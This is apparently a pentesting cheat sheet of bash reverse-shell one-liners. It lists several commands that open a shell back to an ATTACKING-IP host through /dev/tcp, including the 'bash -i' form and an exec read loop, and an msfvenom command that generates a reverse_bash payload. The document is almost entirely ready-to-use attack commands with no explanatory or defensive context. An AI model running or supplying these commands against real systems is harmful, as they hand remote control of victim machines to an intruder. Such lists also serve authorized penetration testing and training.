### Version one
```
exec /bin/bash 0&0 2>&0
```

### Encoded Version
```
exec 5<>/dev/tcp/ATTACKING-IP/80
cat <&5 | while read line; do $line 2>&5 >&5; done
```
  
```
# or:
while read line 0<&5; do $line 2>&5 >&5; done
```

### Version two
```
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
```

### MSFVenom Bash Reverse Shell
```
msfvenom -p cmd/unix/reverse_bash LHOST=ATTACKING-IP LPORT=443 -f raw > reverse-shell.sh
```



